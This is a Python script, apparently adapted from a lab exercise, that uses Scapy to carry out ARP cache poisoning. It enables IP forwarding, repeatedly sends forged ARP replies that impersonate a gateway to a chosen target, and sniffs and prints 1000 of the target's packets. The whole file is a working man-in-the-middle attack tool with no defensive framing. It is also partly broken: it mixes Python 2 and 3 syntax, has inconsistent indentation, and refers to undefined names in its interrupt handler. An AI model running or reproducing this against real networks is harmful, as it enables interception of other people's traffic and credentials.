from scapy.all import *
import os
import sys
import threading
import signal

try:
    interface = sys.argv[1]
    target_ip = sys.argv[2]
    gateway_ip = sys.argv[3]
    conf.iface = interface
except IndexError:
    print("timt.py <interface> <target_ip> <gateway>")
    sys.exit()

packet_count = 1000

fo = open('/proc/sys/net/ipv4/ip_forward','w')
fo.write('1')
fo.close()

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
    hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    # signals the main thread to exit
    


def get_mac(IP):
    ans, unans = arping(IP)
    for _, r in ans:
        return r[Ether].src


def get_mac_(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2,retry=10)
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None

    
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,event):
    #spoof = ARP()
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac
    #poison_target.show()
    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac
    #poison_gateway.show()
    print "[*] Beginning the ARP poison. [CTRL-C to stop]"
    while event.is_set():
        try:
            send(poison_target)
            #send(poison_gateway)
            time.sleep(1)

        except KeyboardInterrupt:
	    print("[*] poison stop")
	    return
            #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	
        else:
	    pass
            #print "[*] ARP poison attack finished."
            #return

# turn off output
#gateway_mac = get_mac(gateway_ip)
#if gateway_mac is None:
#    print "[!!!] Failed to get gateway MAC. Exiting."
#    sys.exit(0)

#else:
    
     # get_mac(target_ip)
#if target_mac is None:
#    print "[!!!] Failed to get target MAC. Exiting."
#    sys.exit(0)
if 0:
    pass

else:
    conf.verb = 0
    print "[*] Setting up %s" % interface
    target_mac = "08:00:27:5a:01:02"
    gateway_mac = "08:00:27:5a:01:01"
    #gateway_mac = "52:54:00:12:35:02"
    print "[*] Target %s is at %s" % (target_ip,target_mac)
    print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)
    # start poison thread
    re = threading.Event()
    re.set()
    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac,target_ip,target_mac, re))
    #poison_thread.deamon = True
    poison_thread.start()
    #try:
    print "[*] Starting sniffer for %d packets" % packet_count

    f = "ip host %s" % target_ip
    try:
	packets = sniff(filter=f, count=packet_count,iface=interface, prn = lambda x: x.show())
	#paketets[0].show()
        # write out the captured packets
        # wrpcap('arper.pcap',packets)
        # restore the network
        #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    except KeyboardInterrupt:
	#posion_thread.stop()
        rw.clear()
	poision_thread.join()
        # restore the network
        #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	#os.kill(os.getpid(), signal.SIGINT)
        #sys.exit(0)
	#pass
    #posion_thread.stop()
